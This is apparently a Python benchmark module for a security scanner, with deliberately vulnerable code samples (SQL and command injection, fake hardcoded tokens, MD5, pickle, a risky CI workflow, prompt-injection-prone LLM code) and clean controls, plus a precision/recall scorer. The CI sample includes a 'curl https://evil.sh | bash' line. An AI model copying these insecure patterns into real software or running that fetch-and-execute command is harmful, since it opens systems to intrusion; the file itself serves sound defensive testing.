"""Mythos benchmark dataset + scorer (H3, stdlib only).

A small, deterministic corpus of vulnerable and clean source snippets used to
score the offline scanners (``mythos_scan``) and as a red-teaming test fixture.
``run_benchmark()`` extracts each case into a temp tree, runs ``scan_target``,
and reports per-case hits plus overall precision/recall. No model, no network.
"""
from __future__ import annotations

import tempfile
from pathlib import Path

from one2one import mythos_scan

# Each vulnerable case: a code tree (dict filename -> contents) and the vuln
# classes the offline scanners must surface there.
BENCHMARK_CASES: list[dict] = [
    {
        "name": "sql-interpolation",
        "tree": {
            "app.py": 'import sqlite3\n'
                      'conn = sqlite3.connect("db.sqlite")\n'
                      'q = f"SELECT * FROM users WHERE id = {request.args[\\"id\\"]}"\n'
                      'conn.execute(q)\n',
        },
        "expected": {"sql-injection"},
    },
    {
        "name": "command-injection",
        "tree": {
            "server.py": 'import os\n'
                         'host = request.json["host"]\n'
                         'os.system(f"ping -c 1 {host}")\n',
        },
        "expected": {"command-injection"},
    },
    {
        "name": "hardcoded-secrets",
        "tree": {
            "creds.py": 'aws = "AKIA1234567890ABCDEF"\n'
                        'gh = "ghp_" + "A" * 36\n'
                        'password = "letmein123"\n',
        },
        "expected": {"hardcoded-secret"},
    },
    {
        "name": "crypto-and-deserialization",
        "tree": {
            "weak.py": 'import hashlib, pickle\n'
                       'digest = hashlib.md5(password.encode()).hexdigest()\n'
                       'obj = pickle.loads(raw_bytes)\n',
        },
        "expected": {"crypto-misuse", "deserialization"},
    },
    {
        "name": "cicd-pipeline",
        "tree": {
            ".github/workflows/ci.yml": 'on: pull_request_target\n'
                                        'jobs:\n'
                                        '  build:\n'
                                        '    env:\n'
                                        '      TOKEN: ${{ secrets.GH_TOKEN }}\n'
                                        '    run: |\n'
                                        '      curl https://evil.sh | bash\n',
            "Dockerfile": "FROM python:latest\nUSER root\n",
        },
        "expected": {"ci-cd-attack", "insecure-config"},
    },
    {
        "name": "llm-surface",
        "tree": {
            "llm.py": 'import openai\n'
                      'prompt = f"You are a bot. User said: {user_input}"\n'
                      'client.chat.completions.create(model="gpt-4o", '
                      'messages=[{"role": "user", "content": prompt}])\n',
        },
        "expected": {"prompt-injection"},
    },
]

# Clean files that must produce NO findings (precision guard).
CLEAN_CASES: list[dict] = [
    {
        "name": "benign-api",
        "tree": {
            "main.py": 'import flask\n'
                       'app = flask.Flask(__name__)\n'
                       '@app.route("/")\n'
                       'def home():\n'
                       '    return "hello"\n',
        },
    },
    {
        "name": "pinned-requirements",
        "tree": {
            "requirements.txt": "flask==3.0.0\nrequests==2.31.0\n",
            "Dockerfile": "FROM python:3.12-slim@sha256:abcdef\nUSER app\n",
        },
    },
]


def _run_case(case: dict, tmp: Path) -> set[str]:
    for name, content in case["tree"].items():
        path = tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return {f.vuln_class for f in mythos_scan.scan_target(tmp)}


def run_benchmark() -> dict:
    """Score the offline scanners against the corpus. Never raises."""
    report = {"cases": [], "vulnerable": 0, "clean": 0,
              "vuln_hits": 0, "vuln_missed": 0, "false_positives": 0,
              "precision": None, "recall": None}
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        for case in BENCHMARK_CASES:
            with tempfile.TemporaryDirectory(dir=root) as inner:
                found = _run_case(case, Path(inner))
            expected = case["expected"]
            hit = expected & found
            miss = expected - found
            entry = {"name": case["name"], "expected": sorted(expected),
                     "found": sorted(found), "hit": sorted(hit), "missed": sorted(miss)}
            report["cases"].append(entry)
            report["vuln_hits"] += len(hit)
            report["vuln_missed"] += len(miss)
            if not miss:
                report["vulnerable"] += 1
        for case in CLEAN_CASES:
            with tempfile.TemporaryDirectory(dir=root) as inner:
                found = _run_case(case, Path(inner))
            entry = {"name": case["name"], "expected": [], "found": sorted(found),
                     "hit": [], "missed": []}
            report["cases"].append(entry)
            report["clean"] += 1
            report["false_positives"] += len(found)
    expected_total = report["vuln_hits"] + report["vuln_missed"]
    if expected_total:
        report["recall"] = report["vuln_hits"] / expected_total
    surfaced = report["vuln_hits"] + report["false_positives"]
    if surfaced:
        report["precision"] = report["vuln_hits"] / surfaced
    return report


def demo() -> None:
    r = run_benchmark()
    assert r["recall"] == 1.0, r          # every expected class surfaced
    assert r["false_positives"] == 0, r   # clean samples stay clean
    assert r["vuln_hits"] >= 8, r
    print(f"OK — mythos_benchmark: recall={r['recall']:.2f} "
          f"precision={r['precision']:.2f}")


if __name__ == "__main__":
    demo()
